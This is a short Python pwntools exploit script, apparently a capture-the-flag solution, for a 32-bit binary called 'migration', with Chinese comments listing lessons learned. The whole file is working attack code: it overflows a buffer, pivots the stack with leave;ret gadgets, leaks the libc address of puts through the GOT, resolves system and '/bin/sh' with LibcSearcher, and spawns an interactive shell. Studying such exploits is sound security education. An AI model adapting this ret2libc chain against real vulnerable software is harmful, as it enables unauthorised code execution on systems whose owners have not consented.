from pwn import *
from LibcSearcher import LibcSearcher
from time import sleep
# context.log_level = "debug"
# 收获
# 1.leave_ret 的灵活运用
# 2.32位下连续调用函数需要清除前一次调用的参数，保持栈平衡
# 3.了解了下 Full Relro ，作用是got表不可写
p = process("./migration")
elf = ELF("./migration")
offset = 0x28
buf1 = 0x804b000 - 0x200
buf2 = buf1 + 0x100
leave_ret = 0x08048418 
p_ebx_ret = 0x0804836d
read_plt = elf.plt["read"]
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]

# read(0 , buf1 , 0x100 ) to extend explote payoad length
payload1 =  "a" * offset + p32(buf1) + p32(read_plt) + p32(leave_ret) + p32(0) + p32(buf1) + p32(0x100)
p.recvuntil(":")
p.send(payload1)
# puts(read_got) and read(0 , buf2 , 0x100)
# leak addr_got and return to payload 2
sleep(0.1)
payload2 = p32(buf2) + p32(puts_plt) + p32(p_ebx_ret) + p32(puts_got) + p32(read_plt) + p32(leave_ret) + p32(0) + p32(buf2) + p32(0x100)
p.sendline(payload2)
# get_addr_puts and get system_addr and str_bin_sh and excute
sleep(0.1)

text = p.recvuntil("\n")

addr_puts =  u32(p.recv(4))
p.recv() # fflush
libc = LibcSearcher("puts" , addr_puts)
libc_base = addr_puts - libc.dump("puts")
system_addr = libc_base + libc.dump("system")
str_bin_sh = libc_base + libc.dump("str_bin_sh")

payload3 = p32(buf1) + p32(system_addr) + p32(buf1) + p32(str_bin_sh)
p.sendline(payload3)

p.interactive()


